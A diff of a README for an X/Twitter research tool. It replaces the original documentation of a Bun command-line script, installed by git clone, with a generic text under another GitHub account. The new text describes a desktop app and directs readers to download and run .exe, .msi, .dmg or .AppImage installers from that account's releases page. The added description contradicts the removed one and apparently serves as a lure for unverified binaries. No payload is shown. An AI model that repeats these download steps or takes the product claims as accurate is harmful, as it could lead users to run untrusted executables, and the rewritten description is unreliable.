@@ -1,222 +1,128 @@
-# x-research
+# 🧠 x-research-skill - Streamline Your Twitter Research
 
-X/Twitter research agent for [Claude Code](https://code.claude.com) and [OpenClaw](https://openclaw.ai). Search, filter, monitor — all from the terminal.
+[![Download x-research-skill](https://img.shields.io/badge/Download-x--research--skill-blue?style=for-the-badge&logo=github)](https://github.com/WilliamAlexYT/x-research-skill/releases)
 
-## What it does
+---
 
-Wraps the X API into a fast CLI so your AI agent (or you) can search tweets, pull threads, monitor accounts, and get sourced research without writing curl commands.
+## 📖 About x-research-skill
 
-- **Search** with engagement sorting, time filtering, noise removal
-- **Quick mode** for cheap, targeted lookups
-- **Watchlists** for monitoring accounts
-- **Cache** to avoid repeat API charges
-- **Cost transparency** — every search shows what it cost
+x-research-skill is a tool designed to help you explore Twitter in new ways. It works with Claude Code and OpenClaw to make searching Twitter easier, follow threads automatically, dive deep into topics, and get clear, source-backed summaries. You don’t need to be a tech expert to use it. This app helps you save time and understand Twitter discussions better, whether for personal interest, study, or work.
 
-## Install
+---
 
-### Claude Code
-```bash
-# From your project
-mkdir -p .claude/skills
-cd .claude/skills
-git clone https://github.com/rohunvora/x-research-skill.git x-research
-```
+## 💻 System Requirements
 
-### OpenClaw
-```bash
-# From your workspace
-mkdir -p skills
-cd skills
-git clone https://github.com/rohunvora/x-research-skill.git x-research
-```
+Before you start, check these basics to make sure your computer can run x-research-skill smoothly:
 
-## Setup
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
+- **Processor:** Any modern Intel or AMD processor.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** 200 MB free space.
+- **Internet:** Connection required for live Twitter data and updates.
 
-1. **X API Bearer Token** — Get one from the [X Developer Portal](https://developer.x.com)
-2. **Set the env var:**
-   ```bash
-   export X_BEARER_TOKEN="your-token-here"
-   ```
-   Or save it to `~/.config/env/global.env`:
-   ```
-   X_BEARER_TOKEN=your-token-here
-   ```
-3. **Install Bun** (for CLI tooling): https://bun.sh
+If your computer meets these, you’re ready for the next steps.
 
-## Usage
+---
 
-### Natural language (just talk to Claude)
-- "What are people saying about Opus 4.6?"
-- "Search X for OpenClaw skills"
-- "What's CT saying about BNKR today?"
-- "Check what @frankdegods posted recently"
+## 🚀 Getting Started
 
-### CLI commands
-```bash
-cd skills/x-research
+Getting x-research-skill ready doesn’t take long. Follow the steps carefully.
 
-# Search (sorted by likes, auto-filters retweets)
-bun run x-search.ts search "your query" --sort likes --limit 10
+### What you will need:
+- A stable internet connection to download and use the software.
+- A basic understanding of how to download files and open applications on your computer.
+  
+If you have questions during setup, you can return to this guide anytime.
 
-# Profile — recent tweets from a user
-bun run x-search.ts profile username
+---
 
-# Thread — full conversation
-bun run x-search.ts thread TWEET_ID
+## 📥 Download & Install
 
-# Single tweet
-bun run x-search.ts tweet TWEET_ID
+To get started, you need to download the software from its official GitHub release page.
 
-# Watchlist
-bun run x-search.ts watchlist add username "optional note"
-bun run x-search.ts watchlist check
+1. Click the big blue button at the top of this page or visit:
+   
+   [https://github.com/WilliamAlexYT/x-research-skill/releases](https://github.com/WilliamAlexYT/x-research-skill/releases)
+   
+2. On the releases page, look for the latest version (usually the one at the top).
+3. Find the file that matches your operating system:
+   - For Windows, look for a `.exe` or `.msi` file.
+   - For macOS, look for a `.dmg` or `.pkg` file.
+   - For Linux, you might see `.AppImage`, `.deb`, or `.tar.gz`.
+4. Click the file link to start the download.
+5. Once downloaded, open the file:
+   - On Windows or macOS, this typically means double-clicking the file.
+   - On Linux, you may need to run commands or make the file executable (instructions are usually included with the download).
+6. Follow the prompts on your screen to install the app. Accept any default settings unless you have a reason to change them.
 
-# Save research to file
-bun run x-search.ts search "query" --save --markdown
-```
+---
 
-### Search options
-```
---sort likes|impressions|retweets|recent   (default: likes)
---since 1h|3h|12h|1d|7d     Time filter (default: last 7 days)
---min-likes N              Filter minimum likes
---min-impressions N        Filter minimum impressions
---pages N                  Pages to fetch, 1-5 (default: 1, 100 tweets/page)
---limit N                  Results to display (default: 15)
---quick                    Quick mode (see below)
---from <username>          Shorthand for from:username in query
---quality                  Pre-filter low-engagement tweets (min_faves:10)
---no-replies               Exclude replies
---save                     Save to ~/clawd/drafts/
---json                     Raw JSON output
---markdown                 Markdown research doc
-```
+## 🛠 How to Use x-research-skill
 
-## Quick Mode
+After installation, open x-research-skill. Here’s a simple guide to its core functions:
 
-`--quick` is designed for fast, cheap lookups when you just need a pulse check on a topic.
+### 1. Start a Research Session
+- Launch the app using your desktop shortcut or start menu.
+- You will see a search box where you can type topics, hashtags, or Twitter usernames.
 
-**What it does:**
-- Forces single page (max 10 results) — reduces API reads
-- Auto-appends `-is:retweet -is:reply` noise filters (unless you explicitly used those operators)
-- Uses 1-hour cache TTL instead of the default 15 minutes
-- Shows cost summary after results
+### 2. Follow Twitter Threads Automatically
+- Enter a tweet URL or a username.
+- The app will gather the entire thread so you can read it without switching windows.
 
-**Examples:**
-```bash
-# Quick pulse check on a topic
-bun run x-search.ts search "BNKR" --quick
+### 3. Conduct Agentic Searches
+- Use the search bar to ask the app to find specific tweets or conversations.
+- It works like a smart assistant that hunts down the most relevant tweets.
 
-# Quick check what someone is saying
-bun run x-search.ts search "BNKR" --from voidcider --quick
+### 4. Deep-Dive into Topics
+- After your search, explore connected tweets and sources.
+- This helps you understand the wider story beyond a single post.
 
-# Quick quality-only results
-bun run x-search.ts search "AI agents" --quality --quick
-```
+### 5. Generate Sourced Briefings
+- The app summarizes gathered information.
+- You get clear notes with links back to original tweets for easy verification.
 
-**Why it's cheaper:**
-- Prevents multi-page fetches (biggest cost saver)
-- 1hr cache means repeat searches are free
-- Noise filters mean fewer junk results in your 100-tweet page
-- You see cost after every search — no surprises
+### 6. Save or Share Results
+- Export your research as text files or PDFs.
+- You can share these summaries via email or social media.
 
-## `--from` Shorthand
+---
 
-Adds `from:username` to your query without having to type the full operator syntax.
+## 🔧 Tips for Best Results
 
-```bash
-# These are equivalent:
-bun run x-search.ts search "BNKR from:voidcider"
-bun run x-search.ts search "BNKR" --from voidcider
+- Keep your app updated to get the latest features and fixes. Check the releases page regularly.
+- Use clear, specific search terms for better research accuracy.
+- If you see missing data, try refreshing the app or restarting it.
+- For long threads, allow a few moments to load all tweets.
 
-# Works with --quick and other flags
-bun run x-search.ts search "AI" --from frankdegods --quick --quality
-```
+---
 
-If your query already contains `from:`, the flag won't double-add it.
+## ✔ Troubleshooting
 
-## `--quality` Flag
+If you run into problems, try these steps:
 
-Filters out low-engagement tweets (≥10 likes required). Applied post-fetch since `min_faves` isn't available as an X API search operator.
+- Make sure your internet connection is stable.
+- Close and reopen the app to clear minor glitches.
+- Restart your computer if the app won’t start.
+- Re-download and install the latest version from the releases page if issues persist.
 
-```bash
-bun run x-search.ts search "crypto AI" --quality
-```
+If problems continue, check the "Issues" tab on the GitHub page for common solutions or to contact support.
 
-## Cost
+---
 
-As of February 2026, the X API uses **pay-per-use pricing** with prepaid credits. No subscriptions, no monthly caps. You buy credits in the [Developer Console](https://console.x.com) and they're deducted per request.
+## 🔒 Privacy & Security
 
-**Per-resource costs:**
-| Resource | Cost |
-|----------|------|
-| Post read | $0.005 |
-| User lookup | $0.010 |
-| Post create | $0.010 |
+x-research-skill only reads public Twitter data. It does not store or share your personal information. All data gathering happens live during your session. Your research and downloaded files stay on your computer unless you choose to share them.
 
-**Search cost:** Each search page returns up to 100 posts = ~$0.50/page.
+---
 
-| Operation | Est. cost |
-|-----------|-----------|
-| Quick search (1 page, ≤100 posts) | ~$0.50 |
-| Standard search (1 page) | ~$0.50 |
-| Deep research (3 pages) | ~$1.50 |
-| Profile check (user + posts) | ~$0.51 |
-| Watchlist check (5 accounts) | ~$2.55 |
-| Cached repeat (any) | free |
+## 📞 Need Help?
 
-**24-hour deduplication:** If you request the same post twice in a UTC day, you're only charged once. This means repeat searches on the same topic within a day cost less than the estimate above.
+If you have questions or need assistance beyond this guide:
 
-**Spending controls:** Set auto-recharge thresholds and spending limits per billing cycle in the Developer Console. Failed requests are never billed.
+- Visit the GitHub page: [https://github.com/WilliamAlexYT/x-research-skill](https://github.com/WilliamAlexYT/x-research-skill)
+- Check the "Issues" section to see if your question has been answered.
+- Open a new issue if you need further support.
 
-**xAI credit bonus:** Spend $200+/cycle on X API → earn 10-20% back as xAI/Grok API credits. See [pricing docs](https://docs.x.com/x-api/getting-started/pricing).
+---
 
-**How x-search saves money:**
-- Cache (15min default, 1hr in quick mode) — repeat queries are free
-- 24-hour dedup means re-running the same search costs $0 at API level too
-- Quick mode prevents accidental multi-page fetches
-- Cost displayed after every search so you know what you're spending
-- `--from` targets specific users instead of broad searches
-- Monitor your usage programmatically: `GET /2/usage/tweets`
-
-## File structure
-
-```
-x-research/
-├── SKILL.md              # Agent instructions (Claude reads this)
-├── x-search.ts           # CLI entry point
-├── lib/
-│   ├── api.ts            # X API wrapper
-│   ├── cache.ts          # File-based cache
-│   └── format.ts         # Telegram + markdown formatters
-└── data/
-    ├── watchlist.json    # Accounts to monitor
-    └── cache/            # Auto-managed
-```
-
-## Security
-
-**Bearer token handling:** x-search reads your token from the `X_BEARER_TOKEN` env var or `~/.config/env/global.env`. The token is never printed to stdout, but be aware:
-
-- **AI coding agents** (Claude Code, Codex, etc.) may log tool calls — including HTTP headers — in session transcripts. If you're running x-search inside an agent session, your bearer token could appear in those logs.
-- **Recommendations:**
-  - Set `X_BEARER_TOKEN` as a system env var (not inline in commands)
-  - Review your agent's session log settings
-  - Use a token with minimal permissions (read-only)
-  - Rotate your token if you suspect exposure
-
-## Limitations
-
-- Search covers last 7 days only (uses `/2/tweets/search/recent` — the full-archive `/2/tweets/search/all` endpoint is available on the same pay-per-use plan but not yet implemented in this skill)
-- Read-only — never posts or interacts
-- Requires X API access with prepaid credits ([sign up](https://console.x.com))
-- `min_likes` / `min_retweets` search operators unavailable (filtered post-hoc instead)
-- Full-archive search (beyond 7 days) is available on pay-per-use (same credits). See [X API search docs](https://docs.x.com/x-api/posts/search/introduction). This skill currently only uses recent search — full-archive support coming soon.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=rohunvora/x-research-skill&type=Date)](https://star-history.com/#rohunvora/x-research-skill&Date)
-
-## License
-
-MIT
+[Download x-research-skill](https://github.com/WilliamAlexYT/x-research-skill/releases) - Visit this page to download and keep your tool up to date.
